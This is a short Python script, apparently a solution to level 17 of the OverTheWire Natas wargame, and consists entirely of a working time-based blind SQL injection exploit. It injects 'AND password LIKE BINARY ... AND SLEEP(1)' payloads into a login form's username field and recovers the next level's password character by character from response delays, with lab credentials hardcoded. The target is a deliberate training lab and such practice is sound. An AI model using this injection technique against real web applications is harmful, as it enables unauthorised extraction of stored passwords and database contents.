import requests
import re
from time import time

def bruteforce_password(url, username, password):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    # Filters chars to narrow the search range
    filtered = ''
    print ('Filtering characters: ', end = '', flush = True)
    for c in characters:
        data = { 'username' : f'natas18" AND password LIKE BINARY "%{c}%" AND SLEEP(1) #'}
        start_time = time()
        response = requests.post(url, auth = (username, password), data = data)
        end_time = time()
        
        if end_time - start_time > 1:
            print(c, end = '', flush = True)
            filtered += c
    
    print()
    validpass = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
    for i in range(32-len(validpass)):
        for c in filtered:
            print(f'Trying password: {validpass + c}', end = '\r')
            data = { 'username' : f'natas18" AND password LIKE BINARY "{validpass + c}%" AND SLEEP(1) #'}

            start_time = time()
            response = requests.post(url, auth = (username, password), data = data)
            end_time = time()

            if end_time - start_time > 1:
                validpass += c
                break
    
    print('\nThe password was found!')
    return validpass

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = f'http://{username}.natas.labs.overthewire.org'

print(bruteforce_password(url, username, password))